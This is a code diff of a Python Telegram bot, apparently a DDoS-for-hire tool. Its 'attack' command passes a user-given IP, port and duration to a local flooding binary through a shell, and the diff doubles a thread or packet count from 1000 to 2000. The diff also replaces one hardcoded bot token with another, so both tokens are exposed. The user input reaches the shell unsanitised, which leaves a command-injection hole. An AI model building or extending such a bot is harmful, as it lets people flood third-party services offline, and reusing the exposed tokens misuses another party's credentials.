@@ -144,7 +144,7 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     # Execute attack command
     try:
         process = subprocess.Popen(
-            f"./Rahul {ip} {port} {duration} 1000",  # Replace with actual attack tool command
+            f"./Rahul {ip} {port} {duration} 2000",  # Replace with actual attack tool command
             shell=True,
             stdout=subprocess.PIPE,
             stderr=subprocess.PIPE
@@ -247,7 +247,7 @@ async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
 # Main function to set up the bot
 def main():
-    app = ApplicationBuilder().token("7899116336:AAEvyWVZMm43a1XgbpWalRvi7zGB4mRU_2g").build()
+    app = ApplicationBuilder().token("7899116336:AAFpQShCGfNYG9WMZe8gioeELSpxs2wGPJk").build()
 
     app.add_handler(CommandHandler("start", start))
     app.add_handler(CommandHandler("help", help_command))
